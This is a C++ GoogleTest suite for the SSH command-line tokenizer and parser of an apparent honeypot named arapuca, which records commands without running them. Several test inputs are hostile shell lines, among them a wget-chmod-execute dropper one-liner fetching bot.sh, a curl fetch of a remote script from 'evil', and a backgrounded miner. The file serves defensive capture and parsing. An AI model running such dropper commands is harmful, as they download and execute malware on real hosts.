#include <arapuca/ssh/command_line.hpp>

#include <gtest/gtest.h>

#include <string>
#include <vector>

namespace {

using arapuca::ssh::parse_command_line;
using arapuca::ssh::Separator;
using arapuca::ssh::tokenize;

TEST(Tokenize, SplitsOnWhitespace) {
    const auto tokens = tokenize("uname   -a\t-r");
    ASSERT_EQ(3U, tokens.size());
    EXPECT_EQ("uname", tokens[0]);
    EXPECT_EQ("-a", tokens[1]);
    EXPECT_EQ("-r", tokens[2]);
}

TEST(Tokenize, EmptyInput) {
    EXPECT_TRUE(tokenize("").empty());
    EXPECT_TRUE(tokenize("    ").empty());
}

TEST(Tokenize, SingleQuotesAreLiteral) {
    const auto tokens = tokenize(R"(echo 'hello world $HOME')");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("hello world $HOME", tokens[1]);
}

TEST(Tokenize, DoubleQuotesKeepSpaces) {
    const auto tokens = tokenize(R"(cat "/opt/my app/.env")");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("/opt/my app/.env", tokens[1]);
}

TEST(Tokenize, BackslashEscapesASpace) {
    const auto tokens = tokenize(R"(cat /opt/my\ app/.env)");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("/opt/my app/.env", tokens[1]);
}

TEST(Tokenize, EmptyQuotedStringIsAToken) {
    const auto tokens = tokenize(R"(passwd "")");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("", tokens[1]);
}

TEST(Tokenize, AdjacentQuotesJoin) {
    const auto tokens = tokenize(R"(echo a"b"c)");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("abc", tokens[1]);
}

// Nothing is expanded, ever. A command substitution is text to record, not a
// command to run, and that is safety invariant S1 at the parsing layer.
TEST(Tokenize, NothingIsExpanded) {
    const auto tokens = tokenize("echo $(curl http://evil/x.sh) $HOME `id`");
    ASSERT_EQ(5U, tokens.size());
    EXPECT_EQ("$(curl", tokens[1]);
    EXPECT_EQ("$HOME", tokens[3]);
    EXPECT_EQ("`id`", tokens[4]);
}

TEST(Tokenize, UnterminatedQuoteKeepsTheRest) {
    const auto tokens = tokenize("echo 'unterminated");
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ("unterminated", tokens[1]);
}

TEST(Tokenize, TokenCountIsBounded) {
    std::string line = "echo";
    for (std::size_t i = 0; i < arapuca::ssh::kMaxTokensPerSegment * 2; ++i) {
        line += " x";
    }
    EXPECT_LE(tokenize(line).size(), arapuca::ssh::kMaxTokensPerSegment);
}

TEST(Tokenize, TokenLengthIsBounded) {
    const std::string line = "echo " + std::string(arapuca::ssh::kMaxTokenLength * 3, 'a');
    const auto tokens = tokenize(line);
    ASSERT_EQ(2U, tokens.size());
    EXPECT_LE(tokens[1].size(), arapuca::ssh::kMaxTokenLength);
}

TEST(Tokenize, PathologicalQuotingIsCheapAndSafe) {
    for (const auto* line :
         {R"(""""""""""""""")", R"('''''''''''''')", R"(\\\\\\\\\\\\\\\)", R"("'"'"'"'"'"'")"}) {
        EXPECT_NO_THROW({ (void)tokenize(line); }) << line;
    }
}

TEST(Tokenize, BinaryBytesSurvive) {
    // Built rather than written as a literal with a hand counted length. That
    // counting mistake has already cost one real defect in this suite.
    std::string line = "echo ";
    line += '\xFF';
    line += '\xFE';
    line += '\x01';

    const auto tokens = tokenize(line);
    ASSERT_EQ(2U, tokens.size());
    EXPECT_EQ(3U, tokens[1].size());
    EXPECT_EQ('\xFF', tokens[1][0]);
}

// --- separators -----------------------------------------------------------

TEST(ParseLine, SingleCommand) {
    const auto parsed = parse_command_line("uname -a");
    ASSERT_EQ(1U, parsed.segments.size());
    EXPECT_EQ(Separator::None, parsed.segments[0].separator);
    EXPECT_EQ("uname", parsed.segments[0].argv[0]);
}

TEST(ParseLine, EmptyLineHasNoSegments) {
    EXPECT_TRUE(parse_command_line("").segments.empty());
    EXPECT_TRUE(parse_command_line("   ;  ; ").segments.empty());
}

// The one liner every dropper uses, and the shape the capture engine keys on.
TEST(ParseLine, ClassicDropperOneLiner) {
    const auto parsed = parse_command_line(
        "cd /tmp; wget http://198.51.100.9/bot.sh && chmod +x bot.sh && ./bot.sh");
    ASSERT_EQ(4U, parsed.segments.size());
    EXPECT_EQ("cd", parsed.segments[0].argv[0]);
    EXPECT_EQ(Separator::Semicolon, parsed.segments[1].separator);
    EXPECT_EQ("wget", parsed.segments[1].argv[0]);
    EXPECT_EQ(Separator::And, parsed.segments[2].separator);
    EXPECT_EQ("chmod", parsed.segments[2].argv[0]);
    EXPECT_EQ(Separator::And, parsed.segments[3].separator);
}

TEST(ParseLine, DistinguishesPipeFromOr) {
    const auto pipe = parse_command_line("ps aux | grep sshd");
    ASSERT_EQ(2U, pipe.segments.size());
    EXPECT_EQ(Separator::Pipe, pipe.segments[1].separator);

    const auto either = parse_command_line("which curl || which wget");
    ASSERT_EQ(2U, either.segments.size());
    EXPECT_EQ(Separator::Or, either.segments[1].separator);
}

TEST(ParseLine, DistinguishesBackgroundFromAnd) {
    const auto background = parse_command_line("./miner &");
    ASSERT_EQ(1U, background.segments.size());

    const auto both = parse_command_line("a & b");
    ASSERT_EQ(2U, both.segments.size());
    EXPECT_EQ(Separator::Background, both.segments[1].separator);

    const auto chained = parse_command_line("a && b");
    ASSERT_EQ(2U, chained.segments.size());
    EXPECT_EQ(Separator::And, chained.segments[1].separator);
}

TEST(ParseLine, SeparatorsInsideQuotesAreNotSeparators) {
    const auto parsed = parse_command_line(R"(echo "a; b && c | d")");
    ASSERT_EQ(1U, parsed.segments.size());
    ASSERT_EQ(2U, parsed.segments[0].argv.size());
    EXPECT_EQ("a; b && c | d", parsed.segments[0].argv[1]);
}

TEST(ParseLine, EscapedSeparatorIsNotASeparator) {
    const auto parsed = parse_command_line(R"(echo a\;b)");
    EXPECT_EQ(1U, parsed.segments.size());
}

TEST(ParseLine, UnterminatedQuoteIsReported) {
    const auto parsed = parse_command_line("echo 'oops");
    EXPECT_TRUE(parsed.unterminated_quote);
    EXPECT_EQ(1U, parsed.segments.size());
}

TEST(ParseLine, RawTextIsKeptForTheTranscript) {
    const auto parsed = parse_command_line("cd /tmp; wget http://x/y");
    ASSERT_EQ(2U, parsed.segments.size());
    EXPECT_NE(std::string::npos, parsed.segments[1].raw.find("wget http://x/y"));
}

TEST(ParseLine, SegmentCountIsBoundedAndFlagged) {
    std::string line = "echo a";
    for (std::size_t i = 0; i < arapuca::ssh::kMaxSegments * 2; ++i) {
        line += "; echo a";
    }
    const auto parsed = parse_command_line(line);
    EXPECT_LE(parsed.segments.size(), arapuca::ssh::kMaxSegments);
    EXPECT_TRUE(parsed.truncated);
}

TEST(ParseLine, LongLineIsSafe) {
    const std::string line(200000, ';');
    EXPECT_NO_THROW({ (void)parse_command_line(line); });

    const std::string quotes(200000, '"');
    EXPECT_NO_THROW({ (void)parse_command_line(quotes); });
}

TEST(ParseLine, SeparatorNamesAreStableForTheSchema) {
    EXPECT_EQ(";", std::string(arapuca::ssh::to_string(Separator::Semicolon)));
    EXPECT_EQ("&&", std::string(arapuca::ssh::to_string(Separator::And)));
    EXPECT_EQ("||", std::string(arapuca::ssh::to_string(Separator::Or)));
    EXPECT_EQ("|", std::string(arapuca::ssh::to_string(Separator::Pipe)));
    EXPECT_EQ("&", std::string(arapuca::ssh::to_string(Separator::Background)));
}

}  // namespace
